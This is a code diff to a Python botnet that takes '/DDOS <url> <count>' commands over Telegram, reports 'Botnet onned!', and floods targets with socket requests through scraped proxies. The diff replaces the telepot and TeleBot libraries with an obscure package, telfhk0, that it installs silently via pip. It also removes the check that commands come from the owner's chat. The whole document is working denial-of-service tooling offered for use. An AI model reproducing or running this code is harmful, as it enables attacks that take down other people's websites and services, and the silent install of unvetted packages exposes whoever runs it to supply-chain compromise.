@@ -16,7 +16,7 @@ import json
 from time import sleep; import socket
 from random import (choice, randint)
 from asyncio import run as ESNET
-from socket import socket, AF_INET, SOCK_DGRAM
+from socket import socket, AF_INET, SOCK_DGRAM,SOCK_STREAM
 
 s = socket(AF_INET, SOCK_DGRAM)
 s.connect(("8.8.8.8", 87))
@@ -33,10 +33,6 @@ if 'windows' in typesys:
     except:pass
 try:from telfhk0 import telfhk0
 except:system('pip3 install telfhk0')
-try:import telepot
-except:system('pip3 install telepot')
-try:from telebot import TeleBot
-except:system('pip3 install TeleBot')
 try:from pyuseragents import random as agent
 except:system('pip3 install pyuseragents')
 try:from datetime import datetime
@@ -70,11 +66,6 @@ if 'linux' in typesys or 'mac' in typesys:
     
 Tel = telfhk0.Telegram(chat=chat_id,token=token)
 text : str = 'Use /DDOS command to attack 🧨\n(Ex : /DDOS https://google.com 1000)\n\n🟡 least : 100 | 🟢 Maximum : 4000'
-try:
-    app = TeleBot(__name__)
-    bot = telepot.Bot(token=token)
-except:
-    quit()
 TargetUr : list = []
 _send2_ : list = []
 counter : int = 0
@@ -91,11 +82,6 @@ with open('Proxyy.txt','w') as proxy_list:
     proxy_list.write(p)
 
 if __name__ == '__main__':
-    try:
-        app.config['api_key'] = token
-    except:
-        print('The token is wrong! ')
-        exit()
     try:
         Tel.SendMessage(text='Botnet onned!')
     except:
@@ -185,7 +171,7 @@ class Start():
             for prx in proxies:
                 prx : list = prx.strip().split(':')
                 try:
-                    s : str = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s : str = socket(AF_INET, SOCK_STREAM)
                     s.connect((str(prx[0]), int(prx[1])))
                     s.send(str.encode(request))
                     current += 1
@@ -325,17 +311,12 @@ while 1:
         while True:
             try:
                 sleep(2)
-                sent : dict = app.get_updates(timeout=int(5), offset=-1)
-                sent_ : list = sent['result']
-                sent_ : dict = sent_[0]
-                sent2 : str = sent_['message']['chat']['id']
-                sent3 : str = sent_['message']['message_id']
-                sent_ : str = sent_['message']['text']
-                if '/DDOS' in sent_ and str(chat_id) in str(sent2):
+                sent_ = Tel.GetMessage(number=-1)
+                if '/DDOS' in sent_:
                     sent = sent_.split(' ')
                     TargetUr.append(sent[1])
                     _send2_.append(sent[2])
-                    TargetUr.append(sent3)
+                    TargetUr.append(sent_)
                     break
             except:
                 pass
@@ -347,7 +328,7 @@ while 1:
             date : list = date.split(' ')
             date : list = date[1].split('.')
             assert Tel.SendMessage(text=f'🟢 your target : {TargetUr[0]} ☠️')
-            snt : dict = bot.sendMessage(chat_id=chat_id, text='🟣 Preparing to attack....', reply_to_message_id=TargetUr[1])
+            snt = dict(Tel.SendMessage('🟣 Preparing to attack....'))
             try:
                 texts : dict = {
                     'text': f'The robots are ready !',
